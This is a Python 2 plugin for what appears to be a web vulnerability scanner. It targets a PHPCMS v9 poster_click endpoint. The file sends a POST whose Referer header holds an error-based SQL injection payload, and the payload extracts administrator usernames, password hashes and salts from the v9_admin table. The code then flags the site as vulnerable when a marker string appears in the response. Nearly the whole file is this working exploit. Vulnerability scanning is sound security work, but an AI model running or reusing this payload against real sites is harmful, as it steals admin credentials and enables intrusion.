#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"index.php?m=poster&c=index&a=poster_click&sitespaceid=1&id=2")
        data=""
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5","Accept": "text/plain","Referer": "1',(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT concat(username,0x4E56535F54455354,password,0x5f,encrypt) FROM v9_admin WHERE 1 ))a from information_schema.tables group by a)b),'1')#"}
        
        
        
        
        
        
        
        
        
        #res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        #print content
        if  content.find('NVS_TEST')>=0:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:phpcms_post_click.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpcms_post_click.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def